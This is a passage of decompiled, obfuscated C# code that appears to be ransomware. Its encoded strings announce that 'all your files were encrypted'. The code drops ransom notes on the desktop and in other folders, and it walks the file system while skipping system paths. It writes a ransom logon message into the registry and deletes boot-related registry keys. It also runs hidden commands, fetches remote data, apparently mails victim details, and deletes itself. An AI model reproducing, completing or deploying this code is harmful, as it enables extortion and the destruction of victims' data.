				getString_0(107412143),
				getString_0(107412166),
				getString_0(107412161),
				getString_0(107412124),
				getString_0(107412119),
				getString_0(107412114),
				getString_0(107412141),
				getString_0(107412132),
				getString_0(107412127),
				getString_0(107412090),
				getString_0(107412085),
				getString_0(107412108),
				getString_0(107412103),
				getString_0(107412098),
				getString_0(107412573),
				getString_0(107412568),
				getString_0(107412563),
				getString_0(107412590),
				getString_0(107412581),
				getString_0(107412576),
				getString_0(107412535),
				getString_0(107412558),
				getString_0(107412553),
				getString_0(107412548),
				getString_0(107412543),
				getString_0(107412506),
				getString_0(107412501),
				getString_0(107412496),
				getString_0(107412519),
				getString_0(107412514),
				getString_0(107412477),
				getString_0(107412472),
				getString_0(107412467),
				getString_0(107412490),
				getString_0(107412481),
				getString_0(107412444),
				getString_0(107412439),
				getString_0(107412434),
				getString_0(107412457),
				getString_0(107412452),
				getString_0(107412447),
				getString_0(107412406),
				getString_0(107412429),
				getString_0(107412416),
				getString_0(107412375),
				getString_0(107412398),
				getString_0(107412389),
				getString_0(107412348),
				getString_0(107412339),
				getString_0(107412366),
				getString_0(107412353),
				getString_0(107411800),
				getString_0(107411791),
				getString_0(107411818),
				getString_0(107411813),
				getString_0(107411772),
				getString_0(107411767),
				getString_0(107411790),
				getString_0(107411785),
				getString_0(107411776),
				getString_0(107411739),
				getString_0(107411734),
				getString_0(107411729),
				getString_0(107411748),
				getString_0(107411707),
				getString_0(107411702),
				getString_0(107411697),
				getString_0(107411724),
				getString_0(107411719),
				getString_0(107411678),
				getString_0(107411673),
				getString_0(107411664),
				getString_0(107411691),
				getString_0(107411686),
				getString_0(107411681),
				getString_0(107411640),
				getString_0(107411635),
				getString_0(107411662),
				getString_0(107411653),
				getString_0(107411648),
				getString_0(107411607),
				getString_0(107411630),
				getString_0(107411625),
				getString_0(107411620),
				getString_0(107411579),
				getString_0(107411570),
				getString_0(107411593),
				getString_0(107411588),
				getString_0(107411583),
				getString_0(107412058),
				getString_0(107412053),
				getString_0(107412076),
				getString_0(107412071),
				getString_0(107412066),
				getString_0(107412021),
				getString_0(107412040),
				getString_0(107411995),
				getString_0(107412014),
				getString_0(107412009),
				getString_0(107412004),
				getString_0(107411999),
				getString_0(107411962),
				getString_0(107411957),
				getString_0(107411952),
				getString_0(107411975),
				getString_0(107411970),
				getString_0(107411933),
				getString_0(107411924),
				getString_0(107411947),
				getString_0(107411942),
				getString_0(107411937),
				getString_0(107411900),
				getString_0(107411895),
				getString_0(107411890),
				getString_0(107411917),
				getString_0(107411912),
				getString_0(107411907),
				getString_0(107411866),
				getString_0(107411861),
				getString_0(107411856),
				getString_0(107411879),
				getString_0(107411834),
				getString_0(107411829),
				getString_0(107411824),
				getString_0(107411851),
				getString_0(107411846),
				getString_0(107411841),
				getString_0(107411292)
			}, new string[0], MKXSGZQsex, getString_0(107411283));
		}
		catch (Exception ex11)
		{
			if (IOdNTzsqoZWVAC)
			{
				try
				{
					File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107411298) + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273));
				streamWriter.WriteLine(gUlAYNDfQee(getString_0(107411240)));
				streamWriter.WriteLine(getString_0(107396655));
				streamWriter.WriteLine(gUlAYNDfQee(getString_0(107405998)));
				streamWriter.WriteLine(GwZQDnKvCkbY);
				if (pPfoNHLnIlcgVkwJ == getString_0(107396993))
				{
					streamWriter.WriteLine(getString_0(107396655));
					streamWriter.WriteLine(gUlAYNDfQee(getString_0(107405965)) + Convert.ToString(aAbwlpshQJNC.Count));
				}
				if (gmYGIhcbzDElW)
				{
					streamWriter.WriteLine(getString_0(107396655));
					streamWriter.WriteLine(gUlAYNDfQee(getString_0(107406400)));
					streamWriter.WriteLine(mYaTrXhnsaDz.CqIShzUcnB());
				}
			}
			else
			{
				string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273));
				if (!text11.Contains(GwZQDnKvCkbY) && !JsBIHINLdKrOq)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273), getString_0(107406367) + GwZQDnKvCkbY);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in AknjtLUSQgBf)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107411273)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273), item + getString_0(107411273), overwrite: true);
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273));
					if (!text12.Contains(GwZQDnKvCkbY) && !JsBIHINLdKrOq)
					{
						File.AppendAllText(item + getString_0(107411273), getString_0(107406367) + GwZQDnKvCkbY);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!nvDjaPaRiDuaffz && num > 10)
			{
				break;
			}
		}
		if (ypGsJRXNFvPKhg == getString_0(107396883))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107406338)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107406338));
					streamWriter2.WriteLine(gUlAYNDfQee(getString_0(107406305)));
					streamWriter2.WriteLine(getString_0(107396655));
					streamWriter2.WriteLine(gUlAYNDfQee(getString_0(107352293)));
					streamWriter2.WriteLine(GwZQDnKvCkbY + gUlAYNDfQee(getString_0(107352204)));
					if (pPfoNHLnIlcgVkwJ == getString_0(107396993))
					{
						streamWriter2.WriteLine(getString_0(107396655));
						streamWriter2.WriteLine(gUlAYNDfQee(getString_0(107352191)) + gUlAYNDfQee(getString_0(107405965)) + Convert.ToString(aAbwlpshQJNC.Count) + gUlAYNDfQee(getString_0(107352204)));
					}
					if (gmYGIhcbzDElW)
					{
						streamWriter2.WriteLine(getString_0(107396655));
						streamWriter2.WriteLine(gUlAYNDfQee(getString_0(107406400)));
						streamWriter2.WriteLine(mYaTrXhnsaDz.CqIShzUcnB());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273));
					if (!text13.Contains(GwZQDnKvCkbY) && !JsBIHINLdKrOq)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107406338), gUlAYNDfQee(getString_0(107352191)) + getString_0(107406367) + GwZQDnKvCkbY + gUlAYNDfQee(getString_0(107352204)));
					}
				}
			}
			catch
			{
			}
		}
		if (zQwlajdXxSCLvhR == getString_0(107396883))
		{
			try
			{
				if (pPfoNHLnIlcgVkwJ == getString_0(107396993))
				{
					mYaTrXhnsaDz.dLOpMuFXHLb(getString_0(107352642), getString_0(107352605), getString_0(107352592), string.Concat(gUlAYNDfQee(getString_0(107396209)), new WebClient().DownloadString(gUlAYNDfQee(getString_0(107396696))), getString_0(107352615), gUlAYNDfQee(getString_0(107396682)), DateTime.Now, getString_0(107396655), gUlAYNDfQee(getString_0(107352610)), Convert.ToString(aAbwlpshQJNC.Count), getString_0(107396655), gUlAYNDfQee(getString_0(107396641)), GwZQDnKvCkbY));
				}
				else
				{
					mYaTrXhnsaDz.dLOpMuFXHLb(getString_0(107352642), getString_0(107352605), getString_0(107352592), string.Concat(gUlAYNDfQee(getString_0(107396209)), new WebClient().DownloadString(gUlAYNDfQee(getString_0(107396696))), getString_0(107352615), gUlAYNDfQee(getString_0(107396682)), DateTime.Now, getString_0(107396655), gUlAYNDfQee(getString_0(107352610)), Convert.ToString(aAbwlpshQJNC.Count), getString_0(107396655), gUlAYNDfQee(getString_0(107396641)), GwZQDnKvCkbY));
				}
			}
			catch
			{
			}
		}
		if (ZqOTHnGaoa == getString_0(107396883))
		{
			try
			{
				bglQGKTlIWkd.QpHissSmRuMtsD(new Uri(getString_0(107352529)));
			}
			catch
			{
			}
		}
		if (ypGsJRXNFvPKhg == getString_0(107396993))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273)))
				{
					Process.Start(gUlAYNDfQee(getString_0(107352528)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411273));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107406338)))
				{
					Process.Start(gUlAYNDfQee(getString_0(107352503)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107406338));
				}
			}
			catch
			{
			}
		}
		if (EzPmbiVliDos == getString_0(107396883))
		{
			if (RdllPUiYOfhoadA == getString_0(107396883) && !string.IsNullOrEmpty(uOwjgyGBImCyTh) && !string.IsNullOrEmpty(MhSAPUAlDsvP))
			{
				HvvdhfGoBYgqDh(uOwjgyGBImCyTh, MhSAPUAlDsvP);
			}
			else
			{
				HvvdhfGoBYgqDh(getString_0(107352518), getString_0(107352489));
			}
		}
		if (wurhcHMiwnSc != getString_0(107351743))
		{
			DaaIPzUHiXc(wurhcHMiwnSc);
		}
		if (!string.IsNullOrEmpty(bBXDBRmEBV))
		{
			try
			{
				File.Delete(bBXDBRmEBV);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397133))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397133)));
			}
		}
		catch (Exception ex14)
		{
			try
			{
				File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107351726) + ex14.Message);
			}
			catch (Exception)
			{
			}
		}
		if (IOdNTzsqoZWVAC)
		{
			try
			{
				File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107351681));
			}
			catch (Exception)
			{
			}
		}
		if (nokUTrFAeAqS == getString_0(107352148))
		{
			cBtlovdwPrJ();
		}
	}

	public static void DYgvMzbGMhCFj()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(gUlAYNDfQee(getString_0(107352171)), gUlAYNDfQee(getString_0(107352518)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int skofznEiFeFXQRJ(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> HxzdYPjHQaGDIWDw(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107351985)) && !text.Contains(getString_0(107351960)) && !text.Contains(getString_0(107351927)) && !text.ToLower().Contains(getString_0(107351942)) && !text.ToLower().Contains(getString_0(107351385)) && !text.Contains(getString_0(107351392)) && !text.Contains(getString_0(107351371)) && !text.ToLower().Contains(getString_0(107351326)) && !text.ToLower().Contains(getString_0(107351313)) && !text.ToLower().Contains(getString_0(107351308)) && !text.ToLower().Contains(getString_0(107351299)) && !text.ToLower().Contains(getString_0(107351250)) && !text.ToLower().Contains(getString_0(107351269)) && !text.ToLower().Contains(getString_0(107351224)) && !text.ToLower().Contains(getString_0(107351235)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107351210)) && !fileInfo.FullName.Contains(getString_0(107351161)) && !fileInfo.FullName.Contains(getString_0(107351176)) && !fileInfo.FullName.Contains(getString_0(107351639)) && !fileInfo.FullName.Contains(getString_0(107351654)) && !fileInfo.FullName.Contains(getString_0(107351605)) && !fileInfo.FullName.Contains(getString_0(107351620)) && !fileInfo.FullName.Contains(getString_0(107351571)) && !fileInfo.FullName.Contains(getString_0(107351590)) && !fileInfo.FullName.Contains(getString_0(107351537)) && !fileInfo.FullName.ToLower().Contains(getString_0(107351556)) && !fileInfo.FullName.ToLower().Contains(getString_0(107351511)) && !fileInfo.FullName.ToLower().Contains(getString_0(107351526)) && !fileInfo.FullName.ToLower().Contains(getString_0(107351477)) && !fileInfo.FullName.Contains(gUlAYNDfQee(getString_0(107351492))) && !fileInfo.FullName.Contains(getString_0(107351467)) && !fileInfo.FullName.Contains(getString_0(107397133)) && !fileInfo.FullName.Contains(getString_0(107351422)) && !fileInfo.FullName.EndsWith(getString_0(107411283)) && !fileInfo.FullName.EndsWith(getString_0(107351429)) && !fileInfo.FullName.EndsWith(getString_0(107351424)) && !fileInfo.FullName.EndsWith(getString_0(107350875)) && !fileInfo.FullName.EndsWith(getString_0(107350870)) && !fileInfo.FullName.Contains(getString_0(107350865)) && !fileInfo.FullName.Contains(tBpNkaUiwdaB) && !fileInfo.FullName.Contains(kZGwVMpcMFQGdu) && !fileInfo.FullName.Contains(BVDNRoTnEzf))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(ejjizMMXKahuYA) * 1024.0 * 1024.0 && pmiCMuEhoSVg == getString_0(107396883))
						{
							list.Add(fileInfo.FullName);
							kKpggOgSXc(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && pmiCMuEhoSVg == getString_0(107396993))
						{
							list.Add(fileInfo.FullName);
							kKpggOgSXc(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void tBBBwzKtqNj()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107350880));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!nVFBdVszaoh.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107350827), getString_0(107396805)).Replace(getString_0(107350822), getString_0(107350827))
					.Replace(getString_0(107350781), getString_0(107352529))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					nVFBdVszaoh.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107350827), getString_0(107396805)).Replace(getString_0(107350822), getString_0(107350827))
						.Replace(getString_0(107350781), getString_0(107352529))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107350776), getString_0(107352529)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string pPOxzMkmHSA(string DWtfydceMf = "", string KFWoTJawPxXy = "")
	{
		string result = getString_0(107352529);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = DWtfydceMf,
				Arguments = KFWoTJawPxXy,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void rDDvZMWRMJDk(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107350767),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string iJCgrnXGsBtuIOeX(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string gUlAYNDfQee(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void hgUFfLstBTaG(string goYraGmhXycwaEdT = "", string fToncbuFxox = "SW5mb3JtYXRpb24uLi4=", string YScHkjkBCt = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		goYraGmhXycwaEdT = iJCgrnXGsBtuIOeX(getString_0(107350750));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(gUlAYNDfQee(goYraGmhXycwaEdT), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(gUlAYNDfQee(getString_0(107350653)), gUlAYNDfQee(fToncbuFxox));
				registryKey.SetValue(gUlAYNDfQee(getString_0(107351132)), gUlAYNDfQee(YScHkjkBCt));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			goYraGmhXycwaEdT = iJCgrnXGsBtuIOeX(getString_0(107351135));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(gUlAYNDfQee(goYraGmhXycwaEdT), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(gUlAYNDfQee(getString_0(107350998)), gUlAYNDfQee(fToncbuFxox));
				registryKey.SetValue(gUlAYNDfQee(getString_0(107350965)), gUlAYNDfQee(YScHkjkBCt));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void RtGLvTThnbG()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (RdllPUiYOfhoadA == getString_0(107396883) && !string.IsNullOrEmpty(uOwjgyGBImCyTh) && !string.IsNullOrEmpty(MhSAPUAlDsvP))
				{
					hgUFfLstBTaG(getString_0(107352529), uOwjgyGBImCyTh, MhSAPUAlDsvP);
				}
				else
				{
					hgUFfLstBTaG(getString_0(107352529), getString_0(107352518), getString_0(107352489));
				}
			}
		}
		catch
		{
		}
	}

	public static void HvvdhfGoBYgqDh(string IDxFLtZpBHvO = "SW5mb3JtYXRpb24uLi4=", string LdJfnITlhQAvciu = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(gUlAYNDfQee(IDxFLtZpBHvO));
		val.set_BalloonTipText(gUlAYNDfQee(LdJfnITlhQAvciu));
		val.ShowBalloonTip(30000);
	}

	public static void DaaIPzUHiXc(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		pPOxzMkmHSA(gUlAYNDfQee(getString_0(107350936)), getString_0(107350951) + text + getString_0(107350910) + string_0);
	}

	public static void RAlhSUgGUPFPfl(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = gUlAYNDfQee(getString_0(107350905));
		processStartInfo.Arguments = getString_0(107350364) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool XVacNoFQjahs(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool vUROAKAZQOddDee(string string_0)
	{
		try
		{
			BZSXgglgClJYZ CS_0024_003C_003E8__locals0 = new BZSXgglgClJYZ();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.sTgNByfgwsvr = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.sTgNByfgwsvr);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107350359);
		}
		catch
		{
			return false;
		}
	}

	public static void VmGKQPbCus()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = iJCgrnXGsBtuIOeX(getString_0(107350382));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(gUlAYNDfQee(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(gUlAYNDfQee(getString_0(107350244)));
					registryKey.DeleteSubKey(gUlAYNDfQee(getString_0(107350219)));
					registryKey.DeleteSubKey(gUlAYNDfQee(getString_0(107350170)));
					registryKey.DeleteSubKey(gUlAYNDfQee(getString_0(107350177)));
					registryKey.DeleteSubKey(gUlAYNDfQee(getString_0(107350905)));
					registryKey.DeleteSubKey(gUlAYNDfQee(getString_0(107350152)));
					registryKey.DeleteSubKey(gUlAYNDfQee(getString_0(107350936)));
					registryKey.Close();
				}
				string_ = iJCgrnXGsBtuIOeX(getString_0(107350635));
				registryKey = Registry.LocalMachine.OpenSubKey(gUlAYNDfQee(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(gUlAYNDfQee(getString_0(107350538)));
					registryKey.Close();
				}
				string_ = iJCgrnXGsBtuIOeX(getString_0(107350489));
				registryKey = Registry.LocalMachine.OpenSubKey(gUlAYNDfQee(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(gUlAYNDfQee(getString_0(107350538)));
					registryKey.Close();
				}
				string_ = iJCgrnXGsBtuIOeX(getString_0(107350489));
				registryKey = Registry.CurrentUser.OpenSubKey(gUlAYNDfQee(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(gUlAYNDfQee(getString_0(107350538)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			pPOxzMkmHSA(gUlAYNDfQee(getString_0(107350504)), gUlAYNDfQee(getString_0(107350455)));
			pPOxzMkmHSA(gUlAYNDfQee(getString_0(107350438)), gUlAYNDfQee(iJCgrnXGsBtuIOeX(getString_0(107350397))));
			pPOxzMkmHSA(gUlAYNDfQee(getString_0(107350438)), gUlAYNDfQee(getString_0(107349771)));
			pPOxzMkmHSA(gUlAYNDfQee(getString_0(107349710)), gUlAYNDfQee(getString_0(107349661)));
		}
		catch
		{
		}
	}

	public static void LoqGoLvZhSEzLPF(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(gUlAYNDfQee(getString_0(107350100)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void UcwHUVhXabZ()
	{
		string string_ = iJCgrnXGsBtuIOeX(getString_0(107350075));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(gUlAYNDfQee(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(gUlAYNDfQee(getString_0(107350026)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string uqJAzDRcogCLtJ(string ndAUNgztYVUKJ, int BvbrbupsjDodZXa = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(BvbrbupsjDodZXa);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(ndAUNgztYVUKJ, 1, intPtr, ref BvbrbupsjDodZXa) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void cBtlovdwPrJ()
	{
		pPOxzMkmHSA(getString_0(107396340), gUlAYNDfQee(getString_0(107349993)));
		string text = gUlAYNDfQee(getString_0(107349287));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107350781) + text + getString_0(107350781) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396340);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void bHpvAtayIadi(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (IOdNTzsqoZWVAC)
			{
				try
				{
					File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107349222) + string_0 + getString_0(107349181) + ex.Message + getString_0(107396655));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string eXbSvlDLJLqL()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107352529);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107349124);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107349115))) ? getString_0(107349129) : getString_0(107349106));
				break;
			case 0:
				text = getString_0(107349152);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107349119);
				break;
			case 4:
				text = getString_0(107349586);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107349600) : getString_0(107349609));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107349581) : getString_0(107395716)) : getString_0(107349554)) : getString_0(107349563));
				break;
			case 10:
				text = getString_0(107349576);
				break;
			}
		}
		if (text != getString_0(107352529))
		{
			text = getString_0(107349571) + text;
			if (oSVersion.ServicePack != getString_0(107352529))
			{
				text = text + getString_0(107350910) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string TasZGQJWiOHVcIozU(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107411273);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(gUlAYNDfQee(getString_0(107411240)));
				streamWriter.WriteLine(getString_0(107396655));
				streamWriter.WriteLine(gUlAYNDfQee(getString_0(107405998)));
				streamWriter.WriteLine(string_0);
				if (gmYGIhcbzDElW)
				{
					streamWriter.WriteLine(getString_0(107396655));
					streamWriter.WriteLine(gUlAYNDfQee(getString_0(107406400)));
					streamWriter.WriteLine(mYaTrXhnsaDz.CqIShzUcnB());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !JsBIHINLdKrOq)
				{
					File.AppendAllText(text, getString_0(107406367) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (IOdNTzsqoZWVAC)
			{
				try
				{
					File.AppendAllText(kZGwVMpcMFQGdu, getString_0(107349526) + ex.Message + getString_0(107396655));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void sdGXnAFhMnQeXrZj(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		aqfJbcykYejZmwL.CgHgUAKNLwPjI CS_0024_003C_003E8__locals0 = new aqfJbcykYejZmwL();
		CS_0024_003C_003E8__locals0.UCbzoZncBa = string_1;
